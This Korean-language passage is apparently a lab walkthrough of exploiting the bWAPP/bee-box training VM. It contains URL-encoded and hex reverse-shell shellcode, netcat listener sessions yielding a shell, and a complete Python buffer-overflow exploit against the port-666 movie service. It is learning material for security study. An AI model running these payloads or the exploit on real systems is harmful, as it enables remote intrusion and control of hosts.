%01%01%01%01%50%2d%ca%e7%7e%95%2d%01%01%01%01%2d%01%01%01%01%50%2d%0f%21%7d%39%2d%01%01%01%01%2d%01%01%01%01%50%2d%e6%58%0e%92%2d%01%01%01%01%2d%01%01%01%01%50%27
```

### 10. BurpSuite로 페이로드 보내기

![image](https://user-images.githubusercontent.com/28076542/53565153-fd784c80-3b9b-11e9-90ef-e47b417e4595.png)

### 11. 결과 확인

```bash
root@ming:~/바탕화면# nc -lvp 4444
listening on [any] 4444 ...
192.168.190.143: inverse host lookup failed: Unknown host
connect to [192.168.190.155] from (UNKNOWN) [192.168.190.143] 36063
whoami
www-data
```

---

## Buffer overflow (Remote) 시도

![image](https://user-images.githubusercontent.com/28076542/53477495-2f17e780-3ab8-11e9-8530-cfa035a78035.png)

* [역시나 여기 참조](https://ejtaal.net/infosec/beebox.html)
* Hint: `\x90*354 + \xa7\x8f\x04\x080 + [payload]`

### 1. 칼리리눅스에서 nmap 실행하여 포트 정보 확인

```bash
root@ming:~/바탕화면# nmap 192.168.190.143

Starting Nmap 7.60 ( https://nmap.org ) at 2019-03-01 11:20 KST
Nmap scan report for 192.168.190.143
Host is up (0.00040s latency).
Not shown: 983 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
666/tcp  open  doom
3306/tcp open  mysql
5901/tcp open  vnc-1
6001/tcp open  X11:1
8080/tcp open  http-proxy
8443/tcp open  https-alt
9080/tcp open  glrpc
MAC Address: 00:0C:29:7B:42:F7 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 3.38 seconds
```

* **666 doom**이 딱 봐도 이상해 보여서 조사하기

### 2. telnet으로 포트 서비스 확인하기

```bash
root@ming:~/바탕화면# telnet 192.168.190.143 666
Trying 192.168.190.143...
Connected to 192.168.190.143.
Escape character is '^]'.
hi
*** bWAPP Movie Service ***
Matching movies: 0
Connection closed by foreign host.
```

* movie 앱을 실행해주는 포트가 맞음

> 모든 웹 사이트가 telnet으로 확인할 수 있지 않고 telnet [아이피] [포트] 입력 후 
```bash
trying...
``` 
만 뜨면 그 웹페이지는 접속 불가하고
```bash
Trying [아이피]
Connected to [아이피].
Escape character is '^]'.
```
이렇게 뜨면 접속이 가능하다.

### 3. 소켓 통신하는 파이썬 스크립트 작성

### Buffer overflow (Local)에서 이용한 shellcode

```txt
\x54\x58\x2d\x79\xfc\xfd\xfd\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x5c\x25\x01\x01\x01\x01\x25\x02\x02\x02\x02\x2d\x75\x1c\x30\x7d\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x53\xdf\x74\x2b\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x12\xca\x20\x1d\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\xf0\xff\xfc\xfc\x2d\x01\x02\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\xfe\xfd\xf9\x02\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\xfe\xfd\xff\xf5\x2d\x01\x01\x02\x01\x2d\x01\x01\x01\x01\x50\x2d\x0c\xfe\xfa\x03\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\xbc\xcd\xc3\xc7\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\xfe\xf5\x02\x37\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x33\x02\x4c\xfe\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x2b\xf5\xba\x0c\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x16\x46\x61\x1e\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x78\x9a\x1a\xab\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x04\x58\x7f\xe7\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x37\xba\xf7\x66\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\xca\xe7\x7e\x95\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x0f\x21\x7d\x39\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\xe6\x58\x0e\x92\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50
```

* `nc -e 192.168.190.155 4444`를 뜻함
* 위에서 했던거는 웹이여서 `%`쓴거니까 `\x`로 바꿔야함
* **앞 뒤 `\x27`(`"`)은 제거했음**

### 칼리리눅스 4444포트에 netcat 열어두기

```bash
root@ming:~/바탕화면# nc -lvp 4444
listening on [any] 4444 ...
```

### test3.py

```python
import socket

# HINT: \x90*354 + \xa7\x8f\x04\x08 + [payload] (remote)
dummy = '\x90' * 354
hint = '\xa7\x8f\x04\x08'
# earse \x27
shellcode =  '\x54\x58\x2d\x79\xfc\xfd\xfd\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x5c\x25\x01\x01\x01\x01\x25\x02\x02\x02\x02\x2d\x75\x1c\x30\x7d\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x53\xdf\x74\x2b\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x12\xca\x20\x1d\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\xf0\xff\xfc\xfc\x2d\x01\x02\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\xfe\xfd\xf9\x02\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\xfe\xfd\xff\xf5\x2d\x01\x01\x02\x01\x2d\x01\x01\x01\x01\x50\x2d\x0c\xfe\xfa\x03\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\xbc\xcd\xc3\xc7\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\xfe\xf5\x02\x37\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x33\x02\x4c\xfe\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x2b\xf5\xba\x0c\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x16\x46\x61\x1e\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x78\x9a\x1a\xab\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x04\x58\x7f\xe7\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x37\xba\xf7\x66\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\xca\xe7\x7e\x95\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\x0f\x21\x7d\x39\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50\x2d\xe6\x58\x0e\x92\x2d\x01\x01\x01\x01\x2d\x01\x01\x01\x01\x50'

buffer = dummy + hint + shellcode
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "\nming..."
s.connect(('192.168.190.143',666))
print "connected"
s.send(buffer)
data = s.recv(1024)
print "send"
s.close()
```

### 4. test3.py 실행

```bash
root@ming:~/바탕화면# nc -lvp 4444
listening on [any] 4444 ...
192.168.190.143: inverse host lookup failed: Unknown host
connect to [192.168.190.155] from (UNKNOWN) [192.168.190.143] 53633
grep . /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04"
```